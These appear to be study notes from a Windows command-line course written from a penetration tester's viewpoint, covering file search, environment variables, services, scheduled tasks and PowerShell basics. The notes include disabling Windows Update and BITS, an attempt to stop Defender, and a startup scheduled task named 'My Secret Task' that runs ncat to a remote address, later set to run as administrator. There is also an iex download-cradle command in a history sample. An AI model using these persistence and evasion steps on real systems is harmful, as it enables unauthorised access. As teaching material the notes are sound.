we can view our history is by utilizing the command `doskey /history`.

`C:\` is the root directory of all Windows machines and has been determined so since it is inception in the MS-DOS and Windows 3.0 days. The "C:\" designation was used commonly as typically "A:\" and "B:\" were recognized as floppy drives, whereas "C:\" was recognized as the first internal hard drive of the machine.

|Name:|Location:|Description:|
|---|---|---|
|%SYSTEMROOT%\Temp|`C:\Windows\Temp`|Global directory containing temporary system files accessible to all users on the system. All users, regardless of authority, are provided full read, write, and execute permissions in this directory. Useful for dropping files as a low-privilege user on the system.|
|%TEMP%|`C:\Users\<user>\AppData\Local\Temp`|Local directory containing a user's temporary files accessible only to the user account that it is attached to. Provides full ownership to the user that owns this folder. Useful when the attacker gains control of a local/domain joined user account.|
|%PUBLIC%|`C:\Users\Public`|Publicly accessible directory allowing any interactive logon account full access to read, write, modify, execute, etc., files and subfolders within the directory. Alternative to the global Windows Temp Directory as it's less likely to be monitored for suspicious activity.|
|%ProgramFiles%|`C:\Program Files`|folder containing all 64-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.|
|%ProgramFiles(x86)%|`C:\Program Files (x86)`|Folder containing all 32-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.|


---
# Moving a directory:
`move source destination`

---
# Using xcopy:
xcopy is a cli utility in windows used for copying files and directories.
`xcopy source destination options`
/E- copies all subdirectories , even if theyre empty.
since copying ,xcopy will reset any attributes(such as read-only or hidden) the file had.If you wish to keep those attributes then you can use /K switch.

---
# Finding Files and Directories:
## Searching With CMD
#### Using Where:

```cmd-session
C:\Users\student\Desktop>where calc.exe

C:\Windows\System32\calc.exe

C:\Users\student\Desktop>where bio.txt

INFO: Could not find files for the given pattern(s).
```
Above, we can see two different tries using the `where` command. First, we searched for `calc.exe`, and it completed showing us the path for calc.exe. This command worked because the system32 folder is in our environment variable path, so the `where` command can look through those folders automatically.

The second attempt we see failed. This is because we are searching for a file that does not exist within that environment path. It is located within our user directory. So we need to specify the path to search in, and to ensure we dig through all directories within that path, we can use the `/R` switch.
#### Recursive Where

Finding Files and Directories

```cmd-session
C:\Users\student\Desktop>where /R C:\Users\student\ bio.txt

C:\Users\student\Downloads\bio.txt
```
## FIND COMMAND:
```cmd-session
C:\Users\student\Desktop> find "password" "C:\Users\student\not-passwords.txt" 
```


#### Find Modifiers

Finding Files and Directories

```cmd-session
C:\Users\student\Desktop> find /N /I /V "IP Address" example.txt  
```
The `/V` modifier can change our search from a matching clause to a `Not` clause. So, for example, if we use `/V` with the search string password against a file, it will show us any line that does not have the specified string. We can also use the `/N` switch to display line numbers for us and the `/I` display to ignore case sensitivity. In the example below, we use all of the modifiers to show us any lines that do not match the string `IP Address` while asking it to display line numbers and ignore the case of the string.
#### Findstr

Finding Files and Directories

```cmd-session
C:\Users\student\Desktop> findstr  
```
The `findstr` command is similar to `find` in that it searches through files but for patterns instead. It will look for anything matching a pattern, regex value, wildcards, and more. Think of it as find2.0. For those familiar with Linux, `findstr` is closer to `grep`.

## COMP
`Comp` will check each byte within two files looking for differences and then displays where they start. By default, the differences are shown in a decimal format. We can use the `/A` modifier if we want to see the differences in ASCII format. The `/L` modifier can also provide us with the line numbers.

#### Compare

Finding Files and Directories

```cmd-session
C:\Users\student\Desktop> comp .\file-1.md .\file-2.md

Comparing .\file-1.md and .\file-2.md...
Files compare OK  
```

Above, we see the comparison come back OK. The files are the same. We can use this as an easy way to check if any scripts, executables, or critical files have been modified.
#### Comparing Different Files

Finding Files and Directories

```powershell-session
PS C:\htb> echo a > .\file-1.md
PS C:\Users\MTanaka\Desktop> echo a > .\file-2.md
PS C:\Users\MTanaka\Desktop> comp .\file-1.md .\file-2.md /A
Comparing .\file-1.md and .\file-2.md...
Files compare OK
<SNIP>
PS C:\Users\MTanaka\Desktop> echo b > .\file-2.md
PS C:\Users\MTanaka\Desktop> comp .\file-1.md .\file-2.md /A
Comparing .\file-1.md and .\file-2.md...
Compare error at OFFSET 2
file1 = a
file2 = b  
```

We used echo to ensure the strings differed and then reran the comparison. Notice how our output changed, and using the /A modifier, we are seeing the character difference between the two files now.
#### Sort

Finding Files and Directories

```cmd-session
C:\Users\student\Desktop> type .\file-1.md
a
b
d
h
w
a
q
h
g

C:\Users\MTanaka\Desktop> sort.exe .\file-1.md /O .\sort-1.md
C:\Users\MTanaka\Desktop> type .\sort-1.md

a
a
b
d
g
h
h
q
w
```

Above, we can see using `sort` on the file `file-1.md` and then sending the result with the `/O` modifier to the file sort-1.md, we took our list of letters, sorted them in alphabetical order, and wrote them to the new file. It can get more complex when working with larger datasets, but the basic usage is still the same. If we wanted `sort` only to return unique entries, we could also use the /unique modifier. Notice the first two entries in the `sort-1.md` file . Let us try using unique and see what happens.

#### unique

Finding Files and Directories

```cmd-session
C:\htb> type .\sort-1.md

a
a
b
d
g
h
h
q
w

PS C:\Users\MTanaka\Desktop> sort.exe .\sort-1.md /unique

a
b
d
g
h
q
w  
```

Notice how we have fewer overall results now. This is because `sort` did not write duplicate entries from the file to the console.

|Scope|Description|Permissions Required to Access|Registry Location|
|---|---|---|---|
|`System (Machine)`|The System scope contains environment variables defined by the Operating System (OS) and are accessible globally by all users and accounts that log on to the system. The OS requires these variables to function properly and are loaded upon runtime.|Local Administrator or Domain Administrator|`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment`|
|`User`|The User scope contains environment variables defined by the currently active user and are only accessible to them, not other users who can log on to the same system.|Current Active User, Local Administrator, or Domain Administrator|`HKEY_CURRENT_USER\Environment`|
|`Process`|The Process scope contains environment variables that are defined and accessible in the context of the currently running process. Due to their transient nature, their lifetime only lasts for the currently running process in which they were initially defined. They also inherit variables from the System/User Scopes and the parent process that spawns it (only if it is a child process).|Current Child Process, Parent Process, or Current Active User|`None (Stored in Process Memory)`|

#### Using set

Environment Variables

```cmd-session
C:\htb> set DCIP=172.16.5.2

```


#### Using set

Environment Variables

```cmd-session
C:\htb> set DCIP=172.16.5.2

```


#### Removing Variables

Much like creating and editing variables, we can also remove environment variables in a very similar manner. To remove variables, we cannot directly delete them like we would a file or directory; instead, we must clear their values by setting them equal to nothing. This action will effectively delete the variable and prevent it from being used as intended due to the value being removed. In our first example, we created the variable `%DCIP%` containing the value of the IP address of the domain controller on the network and permanently saved it into the registry. We can attempt to remove it by doing the following:

#### Using setx

Environment Variables

```cmd-session
C:\htb> setx DCIP ""


SUCCESS: Specified value was saved.
```

## Important Environment Variables

Now that we are comfortable creating, editing, and removing our own environment variables, let us discuss some crucial variables we should be aware of when performing enumeration on a host's environment. Remember that all information found here is provided to us in clear text due to the nature of environment variables. As an attacker, this can provide us with a wealth of information about the current system and the user account accessing it.

| Variable Name         | Description                                                                                                                                                                                                                                                                               |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `%PATH%`              | Specifies a set of directories(locations) where executable programs are located.                                                                                                                                                                                                          |
| `%OS%`                | The current operating system on the user's workstation.                                                                                                                                                                                                                                   |
| `%SYSTEMROOT%`        | Expands to `C:\Windows`. A system-defined read-only variable containing the Windows system folder. Anything Windows considers important to its core functionality is found here, including important data, core system binaries, and configuration files.                                 |
| `%LOGONSERVER%`       | Provides us with the login server for the currently active user followed by the machine's hostname. We can use this information to know if a machine is joined to a domain or workgroup.                                                                                                  |
| `%USERPROFILE%`       | Provides us with the location of the currently active user's home directory. Expands to `C:\Users\{username}`.                                                                                                                                                                            |
| `%ProgramFiles%`      | Equivalent of `C:\Program Files`. This location is where all the programs are installed on an `x64` based system.                                                                                                                                                                         |
| `%ProgramFiles(x86)%` | Equivalent of `C:\Program Files (x86)`. This location is where all 32-bit programs running under `WOW64` are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (`x86` vs. `x64` architecture) |
## Service Controller

[SC](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599\(v=ws.11\)) is a Windows executable utility that allows us to query, modify, and manage host services locally and over the network. For most of this section, we will utilize `SC` as our defacto way to handle services.

## Query Services

Being able to `query` services for information such as the `process state`, `process id` (`pid`), and `service type` is a valuable tool to have in our arsenal as an attacker. We can use this to check if certain services are running or check all existing services and drivers on the system for further information. Before we look specifically into checking the Windows Defender service, let's see what services are currently actively running on the system. We can do so by issuing the following command: `sc query type= service`.
```cmd-session
C:\htb> sc query type= service

SERVICE_NAME: Appinfo
DISPLAY_NAME: Application Information
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AppXSvc
DISPLAY_NAME: AppX Deployment Service (AppXSVC)
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AudioEndpointBuilder
DISPLAY_NAME: Windows Audio Endpoint Builder
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Audiosrv
DISPLAY_NAME: Windows Audio
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: BFE
DISPLAY_NAME: Base Filtering Engine
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: BITS
DISPLAY_NAME: Background Intelligent Transfer Service
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

<SNIP>
```


#### Querying for Windows Defender

Managing Services

```cmd-session
C:\htb> sc query windefend    

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

#### Stopping an Elevated Service

Managing Services

```cmd-session
C:\htb> sc stop windefend

Access is denied.  
```

#### Stopping an Elevated Service as Administrator

Managing Services

```cmd-session
C:\WINDOWS\system32> sc stop windefend

Access is denied.
```

It seems we still do not have the proper access to stop this service in particular. This is a good lesson for us to learn, as certain processes are protected under stricter access requirements than what local administrator accounts have. In this scenario, the only thing that can stop and start the Defender service is the [SYSTEM](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts#default-local-system-accounts) machine account.

Windows updates rely on the following services:

|Service|Display Name|
|---|---|
|`wuauserv`|Windows Update Service|
|`bits`|Background Intelligent Transfer Service|


#### Disabling Windows Update Service

Managing Services

```cmd-session
C:\WINDOWS\system32> sc config wuauserv start= disabled

[SC] ChangeServiceConfig SUCCESS
```

#### Disabling Background Intelligent Transfer Service

Managing Services

```cmd-session
C:\WINDOWS\system32> sc config bits start= disabled

[SC] ChangeServiceConfig SUCCESS
```
#### Tasklist

[Tasklist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) is a command line tool that gives us a list of currently running processes on a local or remote host. However, we can utilize the `/svc` parameter to provide a list of services running under each process on the system.
```cmd-session
C:\htb> tasklist /svc


Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                       108 N/A
smss.exe                       412 N/A
csrss.exe                      612 N/A
wininit.exe                    684 N/A
csrss.exe                      708 N/A
```
#### Using Net Start

[Net start](https://ss64.com/nt/net-service.html) is a very simple command that will allow us to quickly list all of the current running services on a system. In addition to `net start`, there is also `net stop`, `net pause`, and `net continue`. These will behave very similarly to `sc` as we can provide the name of the service afterward and be able to perform the actions specified in the command against the service that we provide.
#### WMIC
The Windows Management Instrumentation Command (`WMIC`) allows us to retrieve a vast range of information from our local host or host(s) across the network. The versatility of this command is wide in that it allows for pulling such a wide arrangement of information. However, we will only be going over a very small subset of the functionality provided by the `SERVICE` component residing inside this application.

To list all services existing on our system and information on them, we can issue the following command: `wmic service list brief` .
#### Display Scheduled Tasks:

#### Query Syntax

|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Query`||Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.|
||/fo|Sets formatting options. We can specify to show results in the `Table, List, or CSV` output.|
||/v|Sets verbosity to on, displaying the `advanced properties` set in displayed tasks when used with the List or CSV output parameter.|
||/nh|Simplifies the output using the Table or CSV output format. This switch `removes` the `column headers`.|
||/s|Sets the DNS name or IP address of the host we want to connect to. `Localhost` is the `default` specified. If `/s` is utilized, we are connecting to a remote host and must format it as "\\host".|
||/u|This switch will tell schtasks to run the following command with the `permission set` of the `user` specified.|
||/p|Sets the `password` in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The `u` and `p` values are only valid when used with the `s` parameter.|

We can view the tasks that already exist on our host by utilizing the `schtasks` command like so:

Working With Scheduled Tasks

```cmd-session
C:\htb> SCHTASKS /Query /V /FO list

Folder: \  
HostName:                             DESKTOP-Victim
TaskName:                             \Check Network Access
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-Victim\htb-admin
Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
Start In:                             N/A
Comment:                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          tru7h
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```
#### Create a New Scheduled Task:

#### Create Syntax

| **Action** | **Parameter** | **Description**                                                                                                               |
| ---------- | ------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| `Create`   |               | Schedules a task to run.                                                                                                      |
|            | /sc           | Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.      |
|            | /tn           | Sets the name for the task we are building. Each task must have a unique name.                                                |
|            | /tr           | Sets the trigger and task that should be run. This can be an executable, script, or batch file.                               |
|            | /s            | Specify the host to run on, much like in Query.                                                                               |
|            | /u            | Specifies the local user or domain user to utilize                                                                            |
|            | /p            | Sets the Password of the user-specified.                                                                                      |
|            | /mo           | Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.                       |
|            | /rl           | Allows us to limit the privileges of the task. Options here are `limited` access and `Highest`. Limited is the default value. |
|            | /z            | Will set the task to be deleted after completion of its actions.                                                              |

Creating a new scheduled task is pretty straightforward. At a minimum, we must specify the following:

- `/create` : to tell it what we are doing
- `/sc` : we must set a schedule
- `/tn` : we must set the name
- `/tr` : we must give it an action to take

#### New Task Creation

Working With Scheduled Tasks

```cmd-session
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```
#### Change Syntax

|**Action**|**Parameter**|**Description**|
|---|---|---|
|-----|-----|-----|
|`Change`||Allows for modifying existing scheduled tasks.|
||/tn|Designates the task to change|
||/tr|Modifies the program or action that the task runs.|
||/ENABLE|Change the state of the task to Enabled.|
||/DISABLE|Change the state of the task to Disabled.|

Ok, now let us say we found the `hash` of the local admin password and want to use it to spawn our Ncat shell for us; if anything happens, we can modify the task like so to add in the credentials for it to use.

Working With Scheduled Tasks

```cmd-session
C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.

```
#### Delete Syntax

|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Delete`||Remove a task from the schedule|
||/tn|Identifies the task to delete.|
||/s|Specifies the name or IP address to delete the task from.|
||/u|Specifies the user to run the task as.|
||/p|Specifies the password to run the task as.|
||/f|Stops the confirmation warning.|

Working With Scheduled Tasks

```cmd-session
C:\htb> schtasks /delete  /tn "My Secret Task" 

WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
```

	In command.exe we can use /? for help.

#### Using Get-Help

CMD Vs. PowerShell

```powershell-session
PS C:\Users\htb-student> Get-Help Test-Wsman

NAME
    Test-WSMan

SYNTAX
    Test-WSMan [[-ComputerName] <string>] [-Authentication {None | Default | Digest | Negotiate | Basic | Kerberos |
    ClientCertificate | Credssp}] [-Port <int>] [-UseSSL] [-ApplicationName <string>] [-Credential <pscredential>]
    [-CertificateThumbprint <string>]  [<CommonParameters>]


ALIASES
    None


REMARKS
    Get-Help cannot find the Help files for this cmdlet on this computer. It is displaying only partial help.
        -- To download and install Help files for the module that includes this cmdlet, use Update-Help.
        -- To view the Help topic for this cmdlet online, type: "Get-Help Test-WSMan -Online" or
           go to https://go.microsoft.com/fwlink/?LinkId=141464.
```
We can use -online to view microsoft docs webpage for the corresponding cmdlet.
![[Pasted image 20250821163630.png]]



#### Using Get-Help After Running Update-Help

CMD Vs. PowerShell

```powershell-session
PS C:\Windows\system32> Get-Help  Test-Wsman

NAME
    Test-WSMan

SYNOPSIS
    Tests whether the WinRM service is running on a local or remote computer.


SYNTAX
    Test-WSMan [[-ComputerName] <System.String>] [-ApplicationName <System.String>]
    [-Authentication {None | Default | Digest | Negotiate | Basic | Kerberos |
    ClientCertificate | Credssp}] [-CertificateThumbprint <System.String>]
    [-Credential <System.Management.Automation.PSCredential>] [-Port <System.Int32>]
    [-UseSSL] [<CommonParameters>]


DESCRIPTION
    The `Test-WSMan` cmdlet submits an identification request that determines
    whether the WinRM service is running on a local or remote computer. If the
    tested computer is running the service, the cmdlet displays the WS-Management
    identity schema, the protocol version, the product vendor, and the product
    version of the tested service.


RELATED LINKS
    Online Version: https://docs.microsoft.com/powershell/module/microsoft.wsman.mana
    gement/test-wsman?view=powershell-5.1&WT.mc_id=ps-gethelp
    Connect-WSMan
    Disable-WSManCredSSP
    Disconnect-WSMan
    Enable-WSManCredSSP
    Get-WSManCredSSP
    Get-WSManInstance
    Invoke-WSManAction
    New-WSManInstance
    New-WSManSessionOption
    Remove-WSManInstance
    Set-WSManInstance
    Set-WSManQuickConfig

REMARKS
    To see the examples, type: "get-help Test-WSMan -examples".
    For more information, type: "get-help Test-WSMan -detailed".
    For technical information, type: "get-help Test-WSMan -full".
    For online help, type: "get-help Test-WSMan -online"
```
#### Get-Location

CMD Vs. PowerShell

```powershell-session
PS C:\Users\DLarusso> Get-Location

Path
----
C:\Users\DLarusso
```

### List the Directory

The `Get-ChildItem` cmdlet can display the contents of our current directory or the one we specify.

#### Get-ChildItem

CMD Vs. PowerShell

```powershell-session
PS C:\htb> Get-ChildItem 

Directory: C:\Users\DLarusso


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/26/2021  10:26 PM                .ssh
d-----         1/28/2021   7:05 PM                .vscode
d-r---         1/27/2021   2:44 PM                3D Objects
d-r---         1/27/2021   2:44 PM                Contacts
d-r---         9/18/2022  12:35 PM                Desktop
d-r---         9/18/2022   1:01 PM                Documents
d-r---         9/26/2022  12:27 PM                Downloads
d-r---         1/27/2021   2:44 PM                Favorites
d-r---         1/27/2021   2:44 PM                Music
dar--l         9/26/2022  12:03 PM                OneDrive
d-r---         5/22/2022   2:00 PM                Pictures
```
### Move to a New Directory

Changing our location is simple; we can do so utilizing the `Set-Location` cmdlet.

#### Set-Location

CMD Vs. PowerShell

```powershell-session
PS C:\htb>  Set-Location .\Documents\

PS C:\Users\tru7h\Documents> Get-Location

Path
----
C:\Users\DLarusso\Documents

```
We could have also given it the full file path like this:

Code: powershell

```powershell
Set-Location C:\Users\DLarusso\Documents  
```
### Display Contents of a File

Now, if we wish to see the contents of a file, we can use `Get-Content`. Looking in the Documents directory, we notice a file called `Readme.md`. 

#### Get-Content

CMD Vs. PowerShell

```powershell-session
PS C:\htb> Get-Content Readme.md  

# ![logo][] PowerShell

Welcome to the PowerShell GitHub Community!
PowerShell Core is a cross-platform (Windows, Linux, and macOS) automation and configuration tool/framework that works well with your existing tools and is optimized
for dealing with structured data (e.g., JSON, CSV, XML, etc.), REST APIs, and object models.
It includes a command-line shell, an associated scripting language and a framework for processing cmdlets. 

<SNIP> 
```
`Get-Command` is like Google for PowerShell commands. If you forget the exact name, you can still find it by searching for part of it.
Using `Get-Command` without additional modifiers will perform a complete output of each cmdlet currently loaded into the PowerShell session. We can trim this down more by filtering on the `verb` or the `noun` portion of the cmdlet.

#### Get-Command (verb)

CMD Vs. PowerShell

```powershell-session
PS C:\htb> Get-Command -verb get

<SNIP>
Cmdlet          Get-Acl                                            3.0.0.0    Microsoft.Pow...
Cmdlet          Get-Alias                                          3.1.0.0    Microsoft.Pow...
Cmdlet          Get-AppLockerFileInformation                       2.0.0.0    AppLocker
Cmdlet          Get-AppLockerPolicy                                2.0.0.0    AppLocker
Cmdlet          Get-AppvClientApplication                          1.0.0.0    AppvClient  
<SNIP>  
```
We can also perform the exact search using the filter `get*` instead of the `-verb` `get`. The Get-Command cmdlet recognizes the `*` as a wildcard and shows each variant of `get`(anything). We can do something similar by searching on the noun as well.

#### Get-Command (noun)

CMD Vs. PowerShell

```powershell-session
PS C:\htb> Get-Command -noun windows*  

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           Apply-WindowsUnattend                              3.0        Dism
Function        Get-WindowsUpdateLog                               1.0.0.0    WindowsUpdate
Cmdlet          Add-WindowsCapability                              3.0        Dism
Cmdlet          Add-WindowsDriver                                  3.0        Dism
Cmdlet          Add-WindowsImage                                   3.0        Dism
Cmdlet          Add-WindowsPackage                                 3.0        Dism
Cmdlet          Clear-WindowsCorruptMountPoint                     3.0        Dism
Cmdlet          Disable-WindowsErrorReporting                      1.0        WindowsErrorR...
Cmdlet          Disable-WindowsOptionalFeature                     3.0        Dism
Cmdlet          Dismount-WindowsImage                              3.0        Dism
Cmdlet          Enable-WindowsErrorReporting                       1.0        WindowsErrorR...
Cmdlet          Enable-WindowsOptionalFeature                      3.0        Dism
```
#### Get-History

CMD Vs. PowerShell

```powershell-session
PS C:\htb> Get-History

 Id CommandLine
  -- -----------
   1 Get-Command
   2 clear
   3 get-command -verb set
   4 get-command set*
   5 clear
   6 get-command -verb get
   7 get-command -noun windows
   8 get-command -noun windows*
   9 get-module
  10 clear
  11 get-history
  12 clear
  13 ipconfig /all
  14 arp -a
  15 get-help
  16 get-help get-module
```
#### Viewing PSReadLine History

CMD Vs. PowerShell

```powershell-session
PS C:\htb> get-content C:\Users\DLarusso\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

get-module
Get-ChildItem Env: | ft Key,Value
Get-ExecutionPolicy
clear
ssh administrator@10.172.16.110.55
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://download.sysinternals.com/files/PSTools.zip')"
Get-ExecutionPolicy

<SNIP>
```
### Clear Screen
`Clear-Host`

#### Hotkeys

| **HotKey**         | **Description**                                                                                                                                     |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| `CTRL+R`           | It makes for a searchable history. We can start typing after, and it will show us results that match previous commands.                             |
| `CTRL+L`           | Quick screen clear.                                                                                                                                 |
| `CTRL+ALT+Shift+?` | This will print the entire list of keyboard shortcuts PowerShell will recognize.                                                                    |
| `Escape`           | When typing into the CLI, if you wish to clear the entire line, instead of holding backspace, you can just hit `escape`, which will erase the line. |
| `↑`                | Scroll up through our previous history.                                                                                                             |
| `↓`                | Scroll down through our previous history.                                                                                                           |
| `F7`               | Brings up a TUI with a scrollable interactive history from our session.                                                                             |
### Aliases

Our last tip to mention is `Aliases`. A PowerShell alias is another name for a cmdlet, command, or executable file. We can see a list of default aliases using the [Get-Alias](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-7.2) cmdlet. Most built-in aliases are shortened versions of the cmdlet, making it easier to remember and quick to use.

#### Using Get-Alias

CMD Vs. PowerShell

```powershell-session
PS C:\Windows\system32> Get-Alias

CommandType     Name                                               Version    Source
                                                                              
-----------     ----                                               -------    -----
Alias           % -> ForEach-Object
Alias           ? -> Where-Object
Alias           ac -> Add-Content
Alias           asnp -> Add-PSSnapin
Alias           cat -> Get-Content
Alias           cd -> Set-Location
Alias           CFS -> ConvertFrom-String                          3.1.0.0    Mi...
Alias           chdir -> Set-Location
Alias           clc -> Clear-Content
Alias           clear -> Clear-Host
Alias           clhy -> Clear-History
Alias           cli -> Clear-Item
Alias           clp -> Clear-ItemProperty
Alias           cls -> Clear-Host
Alias           clv -> Clear-Variable
Alias           cnsn -> Connect-PSSession
Alias           compare -> Compare-Object
Alias           copy -> Copy-Item
Alias           cp -> Copy-Item
Alias           cpi -> Copy-Item
Alias           cpp -> Copy-ItemProperty
Alias           curl -> Invoke-WebRequest
Alias           cvpa -> Convert-Path
Alias           dbp -> Disable-PSBreakpoint
Alias           del -> Remove-Item
Alias           diff -> Compare-Object
Alias           dir -> Get-ChildItem

<SNIP>
```
#### Using Set-Alias

CMD Vs. PowerShell

```powershell-session
PS C:\Windows\system32> Set-Alias -Name gh -Value Get-Help
```

When using `Set-Alias`, we need to specify the name of the alias (`-Name gh`) and the corresponding cmdlet (`-Value Get-Help`).
#### Helpful Aliases

| **Alias**   | **Description**                                                                                     |
| ----------- | --------------------------------------------------------------------------------------------------- |
| `pwd`       | gl can also be used. This alias can be used in place of Get-Location.                               |
| `ls`        | dir and gci can also be used in place of ls. This is an alias for Get-ChildItem.                    |
| `cd`        | sl and chdir can be used in place of cd. This is an alias for Set-Location.                         |
| `cat`       | type and gc can also be used. This is an alias for Get-Content.                                     |
| `clear`     | Can be used in place of Clear-Host.                                                                 |
| `curl`      | Curl is an alias for Invoke-WebRequest, which can be used to download files. wget can also be used. |
| `fl and ft` | These aliases can be used to format output into list and table outputs.                             |
| `man`       | Can be used in place of help.                                                                       |
`PowerView.ps1` is part of a collection of PowerShell modules organized in a project called [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) created by the [PowerShellMafia](https://github.com/PowerShellMafia/PowerSploit) to provide penetration testers with many valuable tools to use when testing Windows Domain/Active Directory environments. Though we may notice this project has been archived, many of the included tools are still relevant and useful in pen-testing today.
## Using PowerShell Modules

Once we decide what PowerShell module we want to use, we will have to determine how and from where we will run it. We also must consider if the chosen module and scripts are already on the host or if we need to get them on to the host. `Get-Module` can help us determine what modules are already loaded.

#### Get-Module

All About Cmdlets and Modules

```powershell-session
PS C:\htb> Get-Module 

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Con...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expan...
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
```#### List-Available

All About Cmdlets and Modules

```powershell-session
PS C:\htb> Get-Module -ListAvailable 

 Directory: C:\Users\tru7h\Documents\WindowsPowerShell\Modules


ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     1.1.0      PSSQLite                            {Invoke-SqliteBulkCopy, Invoke-SqliteQuery, New-SqliteConn...


    Directory: C:\Program Files\WindowsPowerShell\Modules


ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     1.0.1      Microsoft.PowerShell.Operation.V... {Get-OperationValidation, Invoke-OperationValidation}
Binary     1.0.0.1    PackageManagement                   {Find-Package, Get-Package, Get-PackageProvider, Get-Packa...
Script     3.4.0      Pester                              {Describe, Context, It, Should...}
Script     1.0.0.1    PowerShellGet                       {Install-Module, Find-Module, Save-Module, Update-Module...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Set-PSReadLineKeyHandler, Remov...
```

The `-ListAvailable` modifier will show us all modules we have installed but not loaded into our session.
#### List-Available

All About Cmdlets and Modules

```powershell-session
PS C:\htb> Get-Module -ListAvailable 

 Directory: C:\Users\tru7h\Documents\WindowsPowerShell\Modules


